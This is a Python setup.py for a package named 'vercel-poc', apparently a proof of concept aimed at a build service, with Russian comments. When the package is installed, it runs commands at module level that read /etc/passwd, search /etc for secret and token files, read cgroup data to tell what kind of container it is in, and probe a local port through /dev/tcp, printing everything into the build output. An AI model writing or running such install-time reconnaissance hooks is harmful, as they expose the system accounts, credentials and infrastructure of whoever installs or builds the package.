from setuptools import setup
import os
import subprocess

def cmd(command):
    return subprocess.getoutput(command)

print("\n" + "!"*50)
print("--- DEEP INFRA SCAN ---")

# 1. Проверка окружения (кто еще тут есть?)
print(f"[*] USERS: {cmd('cat /etc/passwd')}")
print(f"[*] MOUNTS: {cmd('mount | grep /app')}")

# 2. Поиск 'скрытых' секретов в системных папках
# Мы ищем файлы, которые могут содержать ключи или конфиги облака
print("\n[*] LOOKING FOR CLOUD SECRETS:")
print(cmd("find /etc -name '*service*' -o -name '*secret*' -o -name '*token*' 2>/dev/null | head -n 15"))

# 3. Чтение /proc/self/cgroup
# Это покажет, находимся ли мы в Docker, Kubernetes или чистой виртуалке
print(f"\n[*] CGROUP (Environment Type): \n{cmd('cat /proc/self/cgroup')}")

# 4. Сканирование внутренней сети (быстрый тест)
# Проверим, отвечают ли соседние адреса
print("\n[*] INTERNAL NETWORK TEST:")
print(cmd("timeout 2 bash -c 'cat < /dev/null > /dev/tcp/127.0.0.1/80' && echo 'Port 80 open' || echo 'Port 80 closed'"))

print("--- SCAN FINISHED ---")
print("!"*50 + "\n")

setup(name="vercel-poc", version="1.0.2")
